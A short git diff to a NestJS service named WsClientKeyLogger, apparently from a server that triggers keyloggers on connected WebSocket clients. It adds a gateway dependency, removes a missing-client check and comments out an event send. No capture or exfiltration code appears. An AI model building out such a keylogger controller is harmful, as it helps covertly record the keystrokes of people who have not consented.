@@ -2,6 +2,7 @@ import { KeyLoggerRepository } from "@/src/modules/client/domain/keylogger.repos
 import { Injectable } from "@nestjs/common";
 import { WsClientRepository } from "../../domain/ws-client.repository";
 import { LoggerService } from "@/src/modules/shared/providers";
+import { WsClientGateway } from "../../infrastructure/ws-client.gateway";
 
 @Injectable()
 export class WsClientKeyLogger {
@@ -9,6 +10,7 @@ export class WsClientKeyLogger {
     private readonly keyLoggerRepository: KeyLoggerRepository,
     private readonly wsClientRepository: WsClientRepository,
     private readonly logger: LoggerService,
+    private readonly wsClientGateway: WsClientGateway,
   ) {}
 
   async execute(clientid: string) {
@@ -16,11 +18,6 @@ export class WsClientKeyLogger {
 
     this.keyLoggerRepository.createKeyLogger(clientid);
 
-    const client = this.wsClientRepository.getClient(clientid);
-
-    if (!client) {
-      this.logger.error(`Client socket not found: ${clientid}`);
-      throw new Error("Client not found");
-    }
+    // await this.wsClientGateway.sendEventToClient(clientid, "", {});
   }
 }
